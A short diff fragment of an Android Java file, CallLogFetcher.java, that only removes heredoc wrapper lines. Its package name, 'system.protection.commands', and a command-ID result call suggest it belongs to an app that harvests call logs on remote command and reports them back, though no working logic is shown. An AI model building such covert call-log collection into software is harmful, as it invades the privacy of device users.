@@ -1,4 +1,3 @@
-cat > app/src/main/java/com/android/system/protection/commands/CallLogFetcher.java << 'EOF'
 package com.android.system.protection.commands;
 
 import android.content.Context;
@@ -42,4 +41,3 @@ public class CallLogFetcher {
         CommandProcessor.sendResult(context, commandId, result);
     }
 }
-EOF
